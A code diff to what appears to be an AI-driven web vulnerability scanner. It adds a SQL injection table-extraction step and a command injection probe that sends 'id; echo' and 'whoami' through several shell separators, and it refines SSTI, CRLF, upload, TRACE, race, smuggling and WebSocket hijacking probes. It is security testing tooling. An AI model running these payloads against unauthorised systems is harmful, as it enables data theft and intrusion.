@@ -127,7 +127,9 @@ def probe_reflection(ctx: Context, url: str, param: str,
 
 
 def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
-               data: str | None = None, union_cols: int = 0) -> dict:
+               data: str | None = None, union_cols: int = 0,
+               extract_table: str = "", extract_columns: str = "",
+               extract_rows: int = 5) -> dict:
     tool = "probe_sqli"
     base = _send(ctx, url, param, "1", method, data, tool, "baseline")
     quote = _send(ctx, url, param, "1'", method, data, tool, "syntax probe")
@@ -227,6 +229,46 @@ def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
                         else "quoted", "trace": trace,
                         "note": "column count for UNION SELECT; verify "
                                 "with UNION SELECT NULL,... before citing"}
+    # Opt-in bounded read. The sqli class is proven by a row from a named
+    # table (`argus proof sqli`), and composing the UNION by hand is where a
+    # weaker model spends its budget on syntax instead of on the assessment.
+    # LIMIT is applied here rather than trusted to the caller: five rows is a
+    # proof and a full dump is an incident.
+    if extract_table:
+        table = str(extract_table).strip()
+        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.]{0,63}", table):
+            out["extract"] = {"error": f"{table!r} is not a table identifier"}
+            return out
+        columns = [c.strip() for c in str(extract_columns or "").split(",")
+                   if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.*]{0,63}", c.strip())]
+        if not columns:
+            out["extract"] = {"error": "extract_columns needs at least one "
+                                       "column identifier"}
+            return out
+        width = (out.get("union") or {}).get("columns") or len(columns)
+        width = max(int(width or len(columns)), len(columns))
+        selected = columns + ["NULL"] * (width - len(columns))
+        rows = _ival(extract_rows, 5, 1, 20)
+        quoted_ctx = not ((out.get("union") or {}).get("context") == "numeric")
+        prefix = "1' " if quoted_ctx else "1 "
+        payload = (f"{prefix}UNION SELECT {', '.join(selected)} FROM {table} "
+                   f"LIMIT {rows}-- -")
+        r = _send(ctx, url, param, payload, method, data, tool,
+                  f"union-extract/{table}")
+        body = r.get("body") or ""
+        error = SQL_ERRORS.search(body)
+        out["extract"] = {
+            "table": table, "columns": columns, "limit": rows,
+            "request_id": r["request_id"], "status": r["status"],
+            "width_used": width,
+            "error_marker": error.group(0) if error else None,
+            "changed_from_baseline": _similarity(body, bodies["base"]) < 0.95,
+            "note": ("quote one row from this response in record_finding, with "
+                     "the request_id that named the engine - the class needs "
+                     "both" if not error else
+                     "the engine rejected the UNION: re-read the column count "
+                     "and the context, the payload is in the transcript"),
+        }
     return out
 
 
@@ -266,6 +308,151 @@ def probe_time(ctx: Context, url: str, param: str, method: str = "GET",
     }
 
 
+# The only command this system sends to prove execution: it reads identity,
+# echoes a nonce, changes nothing, opens no socket, leaves no artifact. A
+# destructive payload would void the evidence anyway - argus/proof.py vetoes it.
+_CMDI_SEPARATORS = [
+    ("semicolon", "{base}; {cmd}"),
+    ("pipe", "{base}| {cmd}"),
+    ("and", "{base}&& {cmd}"),
+    ("background", "{base}& {cmd}"),
+    ("newline", "{base}\n{cmd}"),      # a real newline; _inject urlencodes it
+    ("subshell", "{base}$({cmd})"),
+    ("backtick", "{base}`{cmd}`"),
+    ("quoted-break", '{base}"; {cmd} #'),
+]
+
+# The probe and the gate have to agree on what a proof is, or the probe tells
+# the model it has one and the recorder disagrees. These are the matrix's own
+# signatures, imported rather than re-spelled: the earlier copies drifted, and
+# the Windows one matched a JSON `\r` escape on any JSON-returning target.
+from ..proof import IDENTITY_RE as _CMDI_IDENT_RE          # noqa: E402
+from ..proof import _overlaps                        # noqa: E402
+from ..proof import WINIDENT_RE as _CMDI_WINIDENT_RE       # noqa: E402
+from ..proof import NONCE_RE as _CMDI_NONCE_RE             # noqa: E402
+from ..proof import ACTIVE_CTYPE_RE as _UPLOAD_ACTIVE_RE   # noqa: E402
+
+
+def probe_cmdi(ctx: Context, url: str, param: str, method: str = "GET",
+               data: str | None = None, delay_s: int = 4) -> dict:
+    """OS command injection, probed for the artifact the proof matrix needs.
+
+    `probe_time` already finds the blind case. What it cannot produce is the
+    evidence an rce finding requires: an identity line the target computed,
+    carrying a nonce that ties the output to this probe. So this probe sends
+    `id; echo <nonce>` (and the Windows pair) across the separator families and
+    reads the OUTPUT, not the timing.
+
+    The nonce matters for a reason the grading makes explicit: a parameter that
+    merely reflects `id` back as text produces the string `uid=` in the
+    response without executing anything. `argus/proof.py` refuses that case by
+    checking the identity line is absent from the request that produced it -
+    this probe is what gives it a request to check.
+    """
+    tool = "probe_cmdi"
+    nonce = _marker("argus")
+    base = _send(ctx, url, param, "127.0.0.1", method, data, tool, "baseline")
+    base_body = base.get("body", "") or ""
+    # two baselines, max - one measurement on a slow target reads as a delay,
+    # which is why probe_time takes two as well
+    base2 = _send(ctx, url, param, "127.0.0.2", method, data, tool, "baseline-2")
+    baseline_ms = max(base["elapsed_ms"], base2["elapsed_ms"])
+
+    # unix and windows, because the identity line differs and the operator
+    # does not always know which one is answering
+    commands = [("unix", f"id; echo {nonce}"),
+                ("windows", f"whoami & echo {nonce}")]
+    results, proven, echoed_only = [], None, None
+    for family, sep in _CMDI_SEPARATORS:
+        for os_family, cmd in commands:
+            payload = sep.format(base="127.0.0.1", cmd=cmd)
+            r = _send(ctx, url, param, payload, method, data, tool,
+                      f"{family}/{os_family}")
+            body = r.get("body", "") or ""
+            ident = _CMDI_IDENT_RE.search(body) or _CMDI_WINIDENT_RE.search(body)
+            # the nonce must come back, and the identity line must NOT be in
+            # what we sent - otherwise this is the page echoing our payload
+            reflected = bool(ident) and ident.group(0).strip() in payload
+            hit = bool(ident) and not reflected and nonce in body
+            results.append({
+                "separator": family, "os": os_family,
+                "request_id": r["request_id"], "status": r["status"],
+                "identity": ident.group(0) if ident and not reflected else None,
+                "marker_returned": nonce in body,
+                "reflected_only": reflected,
+            })
+            if hit and proven is None:
+                proven = results[-1]
+            elif nonce in body and not ident and echoed_only is None:
+                echoed_only = results[-1]
+            if proven is not None:
+                break
+        if proven is not None:
+            break
+
+    out = {
+        "nonce": nonce,
+        "baseline_ms": baseline_ms,
+        "results": results,
+        "request_ids": {f"{r['separator']}/{r['os']}": r["request_id"]
+                        for r in results},
+    }
+    if proven is not None:
+        out["verdict"] = (f"command output returned: {proven['identity']} with the "
+                          f"probe nonce, via {proven['separator']} "
+                          f"({proven['os']})")
+        out["proof_request_id"] = proven["request_id"]
+        out["note"] = ("record_finding(category='rce') citing this request_id and "
+                       "quoting the identity line - that is the full requirement "
+                       "for the class. Do not escalate: no shell, no write, no "
+                       "download")
+        return out
+    if echoed_only is not None:
+        out["verdict"] = ("marker returned without an identity line - the "
+                          "parameter is reflected, not executed")
+        out["note"] = ("this is a reflection. Check xss instead, and do not "
+                       "record rce: the grading rejects an identity line that "
+                       "appears in its own request")
+        return out
+    # no output channel: fall back to the timing oracle, which is a candidate
+    delay_s = _ival(delay_s, 4, 2, 10)
+    threshold = baseline_ms + delay_s * 700
+    timed = []
+    for family, sep in _CMDI_SEPARATORS[:4]:
+        payload = sep.format(base="127.0.0.1", cmd=f"sleep {delay_s}")
+        r = _send(ctx, url, param, payload, method, data, tool,
+                  f"blind/{family}")
+        if r["elapsed_ms"] < threshold:
+            continue
+        # Repeat before reporting. One slow response on a tarpit, a cold cache
+        # or a GC pause is not an injection, and the note told the caller to
+        # repeat a slow family while the probe itself did not.
+        again = _send(ctx, url, param, payload, method, data, tool,
+                      f"blind/{family}/confirm")
+        if again["elapsed_ms"] < threshold:
+            continue
+        timed.append({"separator": family,
+                      "elapsed_ms": r["elapsed_ms"],
+                      "confirm_ms": again["elapsed_ms"],
+                      "request_id": r["request_id"],
+                      "confirm_request_id": again["request_id"]})
+    out["blind"] = {"threshold_ms": round(threshold, 1), "slow": timed}
+    out["verdict"] = ("blind candidate: delay on " +
+                      ", ".join(t["separator"] for t in timed)) if timed else \
+        "no signal"
+    if timed:
+        out["note"] = ("a timing delta is a candidate, not an rce finding: the "
+                       "class requires command OUTPUT. The delay was measured "
+                       "twice against two baselines; look for an out-of-band "
+                       "channel, and if there is none say so in the report and "
+                       "leave it a candidate")
+    else:
+        out["note"] = "no output and no delay on any separator family"
+        if base_body:
+            out["note"] += " - the parameter may never reach a shell"
+    return out
+
+
 _SSTI_TEMPLATES = [
     ("jinja2/twig", "{{%d+%d}}"),
     ("erb/ejs", "<%%= %d+%d %%>"),
@@ -280,28 +467,65 @@ def probe_ssti(ctx: Context, url: str, param: str, method: str = "GET",
     base = _send(ctx, url, param, _marker("s"), method, data, "probe_ssti", "baseline")
     # a random arithmetic sum is virtually never present naturally -
     # the classic "49" from {{7*7}} collides with dates/ids everywhere
-    a, b = random.randint(10000, 89999), random.randint(1000, 8999)
-    expect = str(a + b)
+    # Two operand pairs, not one. A single product can be a coincidence in the
+    # page - `{{2*2}}` plus "Showing 4 results" - which is why the ssti class
+    # requires a second pair, and a probe that sends one cannot produce
+    # evidence its own class accepts.
+    pairs = [(random.randint(10000, 89999), random.randint(1000, 8999)),
+             (random.randint(90000, 199999), random.randint(9000, 19999))]
     hits = []
     for family, tpl in _SSTI_TEMPLATES:
-        payload = tpl % (a, b)
-        r = _send(ctx, url, param, payload, method, data, "probe_ssti", family)
-        body = r.get("body", "")
-        # expect is a random sum that cannot occur naturally: its presence
-        # alone proves evaluation. Engines that both evaluate AND echo the
-        # raw payload (error pages rendering partial output) still count
-        if expect in body:
-            hits.append({"family": family, "request_id": r["request_id"],
-                         "evidence": f"{payload} -> {expect} in response",
-                         "also_reflected": payload in body})
-        elif payload in body:
-            hits.append({"family": family, "request_id": r["request_id"],
-                         "evidence": "reflected unrendered (not SSTI)", "negative": True})
+        rendered = []
+        for a, b in pairs:
+            payload = tpl % (a, b)
+            expect = str(a + b)
+            r = _send(ctx, url, param, payload, method, data, "probe_ssti",
+                      f"{family}/{a}+{b}")
+            body = r.get("body", "")
+            # The product is a random sum that cannot occur naturally, so its
+            # presence alone proves evaluation - an engine that evaluates AND
+            # echoes the raw payload (an error page rendering partial output)
+            # still counts, which is why `payload not in body` is NOT required
+            # here. Two pairs are, because one product can be a coincidence.
+            if expect in body:
+                rendered.append({"request_id": r["request_id"],
+                                 "payload": payload, "product": expect,
+                                 "also_reflected": payload in body})
+            elif payload in body:
+                hits.append({"family": family, "request_id": r["request_id"],
+                             "evidence": "reflected unrendered (not SSTI)",
+                             "negative": True})
+                break
+            else:
+                break        # the first pair did not render; no second send
+        if len(rendered) == 2:
+            hits.append({
+                "family": family,
+                "request_id": rendered[0]["request_id"],
+                "confirm_request_id": rendered[1]["request_id"],
+                "also_reflected": any(x["also_reflected"] for x in rendered),
+                "evidence": f"{rendered[0]['payload']} -> "
+                            f"{rendered[0]['product']} and "
+                            f"{rendered[1]['payload']} -> "
+                            f"{rendered[1]['product']}"})
+        elif len(rendered) == 1:
+            hits.append({
+                "family": family, "request_id": rendered[0]["request_id"],
+                "also_reflected": rendered[0]["also_reflected"],
+                "evidence": f"{rendered[0]['payload']} -> "
+                            f"{rendered[0]['product']}, second pair did not "
+                            "render - one product can be a coincidence",
+                "unconfirmed": True})
     return {
-        "verdict": ("ssti candidate: " + "; ".join(h["evidence"] for h in hits if not h.get("negative")))
-        if any(not h.get("negative") for h in hits) else "no template evaluation",
+        "verdict": ("ssti candidate: " + "; ".join(
+            h["evidence"] for h in hits if not h.get("negative")))
+        if any(not h.get("negative") for h in hits)
+        else "no template evaluation",
         "baseline_id": base["request_id"],
         "results": hits,
+        "note": ("cite BOTH request_ids of a confirmed family - the class "
+                 "requires two operand pairs, because one product can be a "
+                 "coincidence in the page"),
     }
 
 
@@ -353,6 +577,15 @@ def probe_redirect(ctx: Context, url: str, param: str,
     'starts with /' filters), backslash, userinfo host@, and suffix-
     confusion host.example.org (passes 'contains our host' filters)."""
     host = urllib.parse.urlparse(url).netloc
+    # An in-origin control comes first and is not optional. The requirement
+    # for this class is "a Location off origin, WITH the in-origin control
+    # showing the destination parameter is honoured" - without it the
+    # evidence stops at `candidate`, because a 302 to example.org could be
+    # the app's own behaviour rather than something the parameter caused.
+    ctl = _send(ctx, url, param, "/argus-control", method, data,
+                "probe_redirect", "in-origin control")
+    control = {"request_id": ctl["request_id"], "status": ctl["status"],
+               "location": (ctl.get("headers") or {}).get("location", "")}
     variants = [
         ("canonical", "https://example.org/argus-canary"),
         ("protocol-relative", "//example.org/argus-canary"),
@@ -402,6 +635,10 @@ def probe_redirect(ctx: Context, url: str, param: str,
         "status": first["status"],
         "location": first["location"],
         "variants": hits,
+        "control": control,
+        "note": "cite control.request_id alongside the off-origin hit - the "
+                "requirement is a Location off origin WITH the in-origin "
+                "control showing the parameter is honoured",
     }
 
 
@@ -414,20 +651,30 @@ def probe_crlf(ctx: Context, url: str, param: str,
     checks body splitting, though it is only meaningful when the param is
     NOT reflected into the body anyway."""
     canary = _marker("acrlf")
+    # The control comes FIRST and is not optional. A server that always sends
+    # `x-argus-crlf` would be absurd, but one that always sends `x-cache` is
+    # not, and the proof requirement for this class is a header the request
+    # created - which is unanswerable without a clean response to compare.
+    control = _send(ctx, url, param, "argus-control",
+                    method, data, tool="probe_crlf",
+                    note="clean control for the header comparison")
+    ch = {k.lower() for k in (control.get("headers") or {})}
     hdr_inj = _send(ctx, url, param, f"\r\nX-Argus-Crlf: {canary}",
                     method, data, tool="probe_crlf",
                     note="header inject canary")
     hh = {k.lower(): v for k, v in (hdr_inj.get("headers") or {}).items()}
-    header_hit = "x-argus-crlf" in hh
+    header_hit = "x-argus-crlf" in hh and "x-argus-crlf" not in ch
     # response splitting: %0d%0a%0d%0a<canary> - lands past the header block
     body_inj = _send(ctx, url, param, f"\r\n\r\n{canary}",
                      method, data, tool="probe_crlf", note="body split canary")
     body_hit = canary in (body_inj.get("body") or "")
     if header_hit:
-        verdict = ("crlf injection candidate: CRLF in parameter reached the "
-                   "response as a real 'x-argus-crlf' header - header "
-                   "control allows session fixation, cache poisoning and "
-                   "response splitting")
+        verdict = ("crlf injection: CRLF in the parameter reached the response "
+                   "as a real 'x-argus-crlf' header, and the control response "
+                   "has no such header - header control allows session "
+                   "fixation, cache poisoning and response splitting. Record "
+                   "it citing the inject AND the control, quoting the header "
+                   "line verbatim")
     elif body_hit:
         verdict = ("crlf lead: canary appears in the response body after a "
                    "double-CRLF - could be response splitting OR plain "
@@ -436,11 +683,14 @@ def probe_crlf(ctx: Context, url: str, param: str,
     else:
         verdict = "no crlf signal"
     return {"verdict": verdict,
+            "control_id": control["request_id"],
             "header_inject_id": hdr_inj["request_id"],
             "body_split_id": body_inj["request_id"],
             "injected_header": header_hit,
-            "note": "verify with a second canary header (e.g. Set-Cookie) "
-                    "before recording; quote the injected header verbatim"}
+            "canary": canary,
+            "note": "cite control_id AND header_inject_id - the proof is a "
+                    "header present in one and absent from the other. A "
+                    "canary in the BODY only is reflection, not splitting"}
 
 
 def probe_cors(ctx: Context, url: str) -> dict:
@@ -509,6 +759,7 @@ def probe_cors(ctx: Context, url: str) -> dict:
 
 
 def probe_method(ctx: Context, url: str) -> dict:
+    canary = ""
     r = ctx.client.send("OPTIONS", url, tool="probe_method", note="options")
     h = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
     allow = h.get("allow") or h.get("access-control-allow-methods", "")
@@ -516,10 +767,15 @@ def probe_method(ctx: Context, url: str) -> dict:
     dangerous = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT")
                  if m in allow.upper()]
     if "PUT" in allow.upper():
-        canary = _marker("put")
+        canary = _marker("argusput")
+        # The canary goes in the BODY, not only the path. `put_verified` used
+        # to look for the filename in the GET response, which a server that
+        # stored the file correctly would never return - so a PUT that really
+        # landed read as unverified. The proof is "the bytes I wrote came
+        # back", and that needs the bytes to be identifiable.
         p = ctx.client.send("PUT", url.rstrip("/") + f"/{canary}.txt",
-                            body="argus method probe", tool="probe_method",
-                            note="PUT canary")
+                            body=f"argus method probe {canary}",
+                            tool="probe_method", note="PUT canary")
         out["put_attempt"] = {"status": p["status"], "request_id": p["request_id"]}
         if p["status"] in (200, 201, 204):
             g = ctx.client.send("GET", url.rstrip("/") + f"/{canary}.txt",
@@ -530,9 +786,11 @@ def probe_method(ctx: Context, url: str) -> dict:
                 ctx.client.send("DELETE", url.rstrip("/") + f"/{canary}.txt",
                                 tool="probe_method", note="cleanup canary")
     # TRACE is probed regardless of Allow: that header describes what the
-    # endpoint claims, while TRACE acceptance is a server-level feature
-    # that is frequently on without ever being advertised
-    canary = _marker("tr")
+    # endpoint CLAIMS, while TRACE acceptance is a server-level feature that
+    # is frequently on without ever being advertised. The canary carries the
+    # `argus` prefix because `proof.NONCE_RE` is what ties the echo back to
+    # this probe - a marker the matrix cannot recognise proves nothing.
+    canary = _marker("argustr")
     t = ctx.client.send("TRACE", url, headers={"X-Argus-Trace": canary},
                         tool="probe_method", note="TRACE echo")
     out["trace_attempt"] = {"status": t["status"],
@@ -540,12 +798,19 @@ def probe_method(ctx: Context, url: str) -> dict:
                             "echoes": canary in (t.get("body") or "")}
     out["dangerous_methods"] = dangerous
     if out.get("put_verified"):
-        verdict = "writable method confirmed"
+        verdict = ("writable method confirmed: the PUT was accepted and a "
+                   "later GET returned the bytes it wrote. Record it citing "
+                   "the PUT and the GET - the proof is the pair, not the "
+                   "status")
     elif out.get("trace_attempt", {}).get("echoes"):
-        verdict = "TRACE echoes request (cross-site tracing candidate)"
+        verdict = ("TRACE is enabled and echoes request headers back in the "
+                   "body - cross-site tracing leaks HttpOnly cookies and auth "
+                   "headers to a reading XSS. Record it citing the TRACE "
+                   "exchange and quoting the echoed header line")
     else:
         verdict = f"methods: {allow or 'none advertised'}"
     out["verdict"] = verdict
+    out["canary"] = canary
     return out
 
 
@@ -954,7 +1219,11 @@ def probe_xfh(ctx: Context, url: str, restricted: str | None = None) -> dict:
                if where else [])
 
     out = {"request_id": r["request_id"], "canary": canary,
-           "reflected_in": where}
+           "reflected_in": where,
+           "note": ("reflection alone is a candidate. The xfh class needs the "
+                    "PAIR - the restricted path refused without the header and "
+                    "served with it - so pass `restricted` (e.g. /admin) and "
+                    "cite both request_ids")}
     if restricted:
         p = urllib.parse.urlparse(url)
         direct = ctx.client.send(
@@ -1090,7 +1359,9 @@ def probe_upload(ctx: Context, url: str) -> dict:
     """Unrestricted-upload check: a benign control plus active-content
     files; the stored file being served back with bytes intact is the
     signal (stored XSS / webshell depending on stack)."""
-    canary = _marker("upl")
+    # the prefix has to match proof.NONCE_RE or the gate cannot tie the
+    # served bytes back to this upload
+    canary = _marker("argusupl")
 
     def _multipart(fname: str, ctype: str, content: str):
         b = "----argus" + canary
@@ -1141,13 +1412,40 @@ def probe_upload(ctx: Context, url: str) -> dict:
                                 tool="probe_upload", note=f"fetch {name}")
             entry["fetch_id"] = g["request_id"]
             entry["served"] = canary in (g.get("body") or "")
+            # How it is SERVED is the whole question. The same bytes are
+            # inert as text/plain and script as image/svg+xml, and a
+            # Content-Disposition: attachment neutralises them again - so
+            # record both, because nothing downstream can recover them.
+            gh = {k.lower(): v for k, v in (g.get("headers") or {}).items()}
+            entry["served_ctype"] = gh.get("content-type", "")
+            entry["served_disposition"] = gh.get("content-disposition", "")
+            entry["served_active"] = bool(
+                entry["served"]
+                and _UPLOAD_ACTIVE_RE.match(entry["served_ctype"])
+                and "attachment" not in
+                entry["served_disposition"].lower())
         results.append(entry)
     served = [r for r in results if r["served"]]
-    active = [r for r in served if r["name"] != "control-txt"]
+    # "an active file type was stored" is not the finding; "it is served as
+    # something a browser runs" is. The old verdict conflated them and called
+    # a .svg served as text/plain a candidate.
+    active = [r for r in served
+              if r.get("served_active") and r["name"] != "control-txt"]
+    stored_only = [r for r in served
+                   if r["name"] != "control-txt" and not r.get("served_active")]
     if active:
-        verdict = ("upload candidate: active file type stored and served "
-                   f"({', '.join(r['name'] for r in active)}) - stored "
-                   "XSS or code execution depending on server stack")
+        verdict = ("unrestricted upload: stored and served as active content "
+                   + "; ".join(f"{r['name']} as {r['served_ctype']}"
+                               for r in active)
+                   + " - stored XSS in this origin. Record it citing the "
+                     "upload AND the fetch; the content-type is the proof")
+    elif stored_only:
+        verdict = ("uploads of active file types are STORED but served "
+                   + "; ".join(f"{r['name']} as "
+                               f"{r['served_ctype'] or '(no content-type)'}"
+                               for r in stored_only)
+                   + " - inert as served. Worth a note, not a finding, unless "
+                     "another path serves the same file differently")
     elif served:
         verdict = ("uploads are stored and served; active types blocked "
                    "or undisclosed - try extensions/content manually")
@@ -1190,7 +1488,18 @@ def probe_race(ctx: Context, url: str, method: str = "GET",
     # If the burst took ~as long as the requests would serially, nothing
     # actually overlapped and a multi-success cannot evidence a race.
     serial_est = sum(r.get("elapsed_ms", 0) for r in rs) / 1000
-    overlapped = not serial_est or burst_s < serial_est * 0.85
+    wall_overlap = not serial_est or burst_s < serial_est * 0.85
+    # ...but the GATE does not take this probe's word for it: it reconstructs
+    # each window as [ts - elapsed_ms, ts] from the recorded entries and
+    # tests intersection. Two computations of one fact will disagree, and
+    # they did: on Windows runners `ts` is coarser than `elapsed_ms`, so the
+    # probe reported `overlapped` while the gate found no intersection and
+    # refused - a probe claiming something the gate denies. So the authority
+    # is the gate's reconstruction, computed here from the same bytes.
+    recorded = [ctx.session._transcript.get(r["request_id"]) for r in rs]
+    recorded = [e for e in recorded if isinstance(e, dict)]
+    overlapped = any(_overlaps(a, b) for a in recorded for b in recorded
+                     if a is not b)
     serial: list[dict] = []
     if len(ok) > 1:
         serial = [_fire("serial baseline"), _fire("serial baseline")]
@@ -1201,15 +1510,22 @@ def probe_race(ctx: Context, url: str, method: str = "GET",
                    f"{len(serial)} serial probes also succeeded - the "
                    "action is repeatable, not a one-time race")
     elif len(ok) > 1 and not overlapped:
-        verdict = ("inconclusive: burst requests were serialized "
-                   f"(burst {burst_s}s ~= serial estimate {serial_est:.1f}s) - "
-                   "raise --rate or increase n and retry")
+        verdict = ("inconclusive: the recorded windows do not intersect, so "
+                   "nothing was on the wire at once "
+                   f"(burst {burst_s}s vs serial estimate {serial_est:.1f}s"
+                   + ("; wall-clock says they did overlap, but the gate "
+                      "reconstructs from ts and elapsed_ms and that is what "
+                      "a verifier can check" if wall_overlap else "")
+                   + ") - raise --rate or increase n and retry")
     elif len(ok) > 1:
-        verdict = (f"race candidate: {len(ok)}/{n} concurrent requests "
-                   f"succeeded but serial probes now return "
-                   f"{[r['status'] for r in serial]} - a limited action "
-                   "was crossed under concurrency; confirm by checking "
-                   "server-side state")
+        verdict = (f"race: {len(ok)}/{n} concurrent requests succeeded but "
+                   f"serial probes now return "
+                   f"{[r['status'] for r in serial]} - a limited action was "
+                   "crossed under concurrency. Record it citing the "
+                   "overlapping burst requests AND the serial baseline; the "
+                   "refusal is what shows there was a limit, and the gate "
+                   "reconstructs the overlap from the recorded timings "
+                   "rather than taking this probe's word for it")
     elif len(ok) == 1:
         verdict = ("single success in burst - no race window observed "
                    "(or the action was already consumed)")
@@ -1218,6 +1534,8 @@ def probe_race(ctx: Context, url: str, method: str = "GET",
                    f"{statuses} - endpoint may not be one-time")
     return {"verdict": verdict, "statuses": statuses,
             "burst_seconds": burst_s, "overlapped": overlapped,
+            "wall_clock_overlap": wall_overlap,
+            "serial_estimate_s": round(serial_est, 2),
             "serial_statuses": [r["status"] for r in serial],
             "results": [{"status": r["status"],
                          "request_id": r["request_id"]} for r in rs]}
@@ -1372,7 +1690,10 @@ def probe_ppoll(ctx: Context, pollute_url: str, check_url: str) -> dict:
     else:
         verdict = "no prototype-pollution signal"
     return {"verdict": verdict, "before_id": before["request_id"],
-            "pollute_id": poll["request_id"], "after_id": after["request_id"]}
+            "pollute_id": poll["request_id"], "after_id": after["request_id"],
+            "note": ("cite all three ids: the class needs the marker sent by "
+                     "the polluting request and observed in a later read that "
+                     "did not send it")}
 
 
 # the 'G' byte must show up in the error to count as desync evidence -
@@ -1418,7 +1739,7 @@ def probe_smuggle(ctx: Context, url: str) -> dict:
                            "dropped connection; retry manually",
                 "ambiguous_id": s1["request_id"], "sends": sends}
     if s2["status"] >= 400 and _SMUGGLE_G.search(s2.get("body") or ""):
-        return {"verdict": "cl.te desync candidate: the stray 'G' poisoned "
+        return {"verdict": "cl.te desync: the stray 'G' poisoned "
                            "the next request's method line - back-end parsed "
                            "chunked framing while the front-end forwarded "
                            "Content-Length bytes",
@@ -1445,7 +1766,7 @@ def probe_smuggle(ctx: Context, url: str) -> dict:
                            "response", "sends": sends + sends2}
     t1, t2 = sends2[0], sends2[1]
     if t2["status"] >= 400 and _SMUGGLE_G.search(t2.get("body") or ""):
-        return {"verdict": "te.cl desync candidate: the smuggled 'GPOST' "
+        return {"verdict": "te.cl desync: the smuggled 'GPOST' "
                            "request answered on its own - back-end honored "
                            "Content-Length while the front-end forwarded "
                            "chunked framing",
@@ -1470,7 +1791,7 @@ def probe_smuggle(ctx: Context, url: str) -> dict:
             continue
         o1, o2 = sends3
         if o2["status"] >= 400 and _SMUGGLE_G.search(o2.get("body") or ""):
-            return {"verdict": "cl.te desync candidate (obfuscated TE "
+            return {"verdict": "cl.te desync (obfuscated TE "
                                f"{obf!r}): the stray 'G' poisoned the next "
                                "request's method line - front-end did not "
                                "honor the non-canonical TE while the "
@@ -1569,46 +1890,65 @@ def probe_disclosure(ctx: Context, url: str) -> dict:
                     "quote it verbatim when recording"}
 
 
-def probe_websocket(ctx: Context, url: str) -> dict:
-    """WebSocket discovery: RFC 6455 upgrade handshake. A 101 with
-    Upgrade: websocket confirms a live ws channel - then test authz and
-    message-level controls manually (raw ws framing is out of httpx's
-    scope, so this probe stops at the handshake)."""
-    import base64
-    import os
-    key = base64.b64encode(os.urandom(16)).decode()
-    r = ctx.client.send(
-        "GET", url,
-        headers={"Upgrade": "websocket", "Connection": "Upgrade",
-                 "Sec-WebSocket-Key": key, "Sec-WebSocket-Version": "13"},
-        tool="probe_websocket", note="ws upgrade handshake")
-    hdrs = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
-    upgrade = str(hdrs.get("upgrade", "")).lower()
-    accept = hdrs.get("sec-websocket-accept", "")
-    if r["status"] == 101 and "websocket" in upgrade:
-        # verify the accept token: a broken server may 101 without
-        # completing the RFC 6455 challenge - worth noting either way
-        import hashlib
-        want = base64.b64encode(hashlib.sha1(
-            (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()
-        ).digest()).decode()
-        if accept and accept != want:
-            verdict = ("websocket 101 received but Sec-WebSocket-Accept is "
-                       "WRONG - handshake not RFC-compliant; the endpoint "
-                       "may be a mock or middleware, probe manually")
-        else:
-            verdict = ("websocket endpoint confirmed (101 + valid accept) "
-                       "- channel is open; test per-message authorization "
-                       "and input handling with a ws client")
-    elif r["status"] in (400, 426):
-        verdict = f"upgrade refused (HTTP {r['status']}) - endpoint may not be ws"
-    elif r["status"] == 200:
-        verdict = ("no ws upgrade: plain 200 - endpoint ignores the "
-                   "handshake headers")
+def probe_websocket(ctx: Context, url: str, message: str = "") -> dict:
+    """Cross-site WebSocket hijacking: a foreign Origin, and a real frame.
+
+    This probe used to stop at the handshake, because httpx cannot frame.
+    `GuardedClient.send_ws` can, so it now does both halves the class needs:
+    a handshake carrying an Origin the target does not own, and one masked
+    text frame whose answer is read back off the wire.
+
+    A 101 followed by silence is a handshake, not a hijackable channel, and
+    the difference is the whole point - so the frame is not optional.
+    """
+    canary = _marker("argusws")
+    probe_origin = "https://argus-probe.invalid"
+    # The canary is PREPENDED, never replaced: with `message` supplied it
+    # used to be dropped and then still required in the reply, so a real
+    # cross-origin echo channel graded `unproven` because the probe had not
+    # sent the thing it was looking for.
+    payload = f"{canary} {message}" if message else f"{canary} argus-probe"
+    out = ctx.client.send_ws(url, payload,
+                             origin=probe_origin, tool="probe_websocket",
+                             note="cross-origin ws handshake + one frame")
+    res = {"verdict": "", "canary": canary, "sent": payload,
+           "origin_sent": probe_origin,
+           "handshake_id": out.get("handshake_id", ""),
+           "message_id": out.get("message_id", ""),
+           "status": out.get("status", 0),
+           "accept_ok": bool(out.get("accept_ok")),
+           "answered": bool(out.get("answered")),
+           "reply": str(out.get("reply") or "")[:2000]}
+    if out.get("error"):
+        res["error"] = out["error"]
+    echoed = res["answered"] and canary in res["reply"]
+    if res["accept_ok"] and echoed:
+        res["verdict"] = (
+            "cross-site websocket hijacking: the handshake was accepted from "
+            f"{probe_origin} - an origin this target does not own - and the "
+            "channel answered a frame carrying our nonce. Any page can open "
+            "this socket in a victim's browser, with the victim's cookies. "
+            "Record it citing the handshake AND the frame")
+    elif res["accept_ok"] and res["answered"]:
+        res["verdict"] = (
+            "cross-origin handshake accepted and a frame came back, but it "
+            "carries no nonce we sent - the answer cannot be tied to this "
+            "channel. Re-send with a canary before recording")
+    elif res["accept_ok"]:
+        res["verdict"] = (
+            "cross-origin handshake accepted (101 + valid accept) but the "
+            "channel answered nothing - a handshake is not a hijackable "
+            "channel. Try an application-level message the endpoint expects")
+    elif res["status"] == 101:
+        res["verdict"] = (
+            "101 received but Sec-WebSocket-Accept does not answer the key "
+            "we sent - middleware or a mock, not a WebSocket endpoint")
+    elif res["status"] in (400, 403, 426):
+        res["verdict"] = (
+            f"upgrade refused (HTTP {res['status']}) - either not a ws "
+            "endpoint, or the Origin check this class is about is working")
     else:
-        verdict = f"no ws signal (HTTP {r['status']})"
-    out = {"verdict": verdict, "request_id": r["request_id"],
-           "status": r["status"]}
-    if accept:
-        out["accept_token"] = accept
-    return out
+        res["verdict"] = f"no ws signal (HTTP {res['status']})"
+    return res
+
+
